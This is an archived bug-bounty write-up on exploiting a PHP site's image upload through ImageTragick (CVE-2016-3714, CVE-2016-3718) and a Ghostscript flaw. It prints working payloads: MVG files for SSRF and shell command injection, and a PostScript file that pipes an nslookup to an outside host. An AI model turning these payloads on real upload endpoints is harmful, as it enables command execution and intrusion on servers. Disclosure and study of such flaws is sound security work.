---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-11_unrestricted-file-upload-leads-to-ssrf-and-rce.md
original_filename: 2021-11-11_unrestricted-file-upload-leads-to-ssrf-and-rce.md
title: Unrestricted File Upload Leads to SSRF and RCE
category: documents
detected_topics:
- supply-chain
- ssrf
- xss
- command-injection
- file-upload
- api-security
tags:
- imported
- documents
- supply-chain
- ssrf
- xss
- command-injection
- file-upload
- api-security
language: en
raw_sha256: 478a33e1145e006b189929c4777af8f6dc3b5e9c4a3410a38ee5e51d7aebfcce
text_sha256: 5eb26cd1feaf541410e576302cc43e72fc02811ee6efebcc50491b4af7ac0bf7
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Unrestricted File Upload Leads to SSRF and RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-11_unrestricted-file-upload-leads-to-ssrf-and-rce.md
- Source Type: markdown
- Detected Topics: supply-chain, ssrf, xss, command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `478a33e1145e006b189929c4777af8f6dc3b5e9c4a3410a38ee5e51d7aebfcce`
- Text SHA256: `5eb26cd1feaf541410e576302cc43e72fc02811ee6efebcc50491b4af7ac0bf7`


## Content

---
title: "Unrestricted File Upload Leads to SSRF and RCE"
page_title: "Unrestricted File Upload Leads to SSRF and RCE | וֹtsƒα∂ιη𝔊"
url: "https://itsfading.github.io/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/"
final_url: "https://itsfading.github.io/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/"
authors: ["Muhammad Adel (@ItsFadinG_)"]
bugs: ["ImageTragick", "Unrestricted file upload", "SSRF", "RCE"]
publication_date: "2021-11-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3181
---

## **Introduction**

Peace be upon you all, I am going to share with you a vulnerability that I have found almost a year ago and it is remarkable for me because it was the first critical one for me anyway let’s jump in.

## **ImageMagick**

It is a package commonly used by web services to process images. A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP’s imagick, Ruby’s rmagick and paperclip, and nodejs’s imagemagick.. it has been commonly exploited in 2016 when Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in it under the CVEs **(CVE-2016-3714 - CVE-2016-3718 - CVE-2016-3715 - CVE-2016-3716 - CVE-2016-3717).** you can know more information about the vulnerability form here:  
<https://imagetragick.com/>

## **The Finding**

I was testing the target for a couple of days and I was able to find multiple trivial XSS that gives me an indication that this target didn’t test well before. Also, the target was running with PHP and I love it as Bug Hunter :). I looked for the file upload vulnerability and I started by sending it to Burp plugin which test the file upload vulnerability. after some minutes I saw that red message saying the target is vulnerable to CVE-2016-3714. great, it is time for validating.

### **SSRF via CVE-2016-3718**

I will setup burp collaborator to receive the connection then simply add the following payload and replace it with your web server URL:

`
  
  
  1
  2
  3
  4
  

| 
  
  
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(http://example.com/)'
  pop graphic-context
  
  
---|---  
`

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

### **RCE via CVE-2016-3714**

Now, we have confirmed that it is using the image magic library and it is vulnerable to SSRF so let’s try to get RCE.

`
  
  
  1
  2
  3
  4
  

| 
  
  
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/image.jpg";|ls "-la)'
  pop graphic-context
  
  
---|---  
`

I tried it but it didn’t give back anything. maybe it is blind?

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

Great it is working perfectly!!

### **RCE via GhostScript**

After digging deeper I found that it is also vulnerable to ghostscript vulnerability which also will allow us to get RCE. let’s see the following payload:

`
  
  
  1
  2
  3
  4
  5
  6
  

| 
  
  
  %!PS
  userdict /setpagedevice undef
  legal
  { null restore } stopped { pop } if
  legal
  mark /OutputFile (%pipe%nslookup <url>) currentdevice putdeviceprops
  
  
---|---  
`

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

## **Conclusion**

I hope you enjoyed reading this and if you have any question feel free to ping me any time, Happy Hunting!
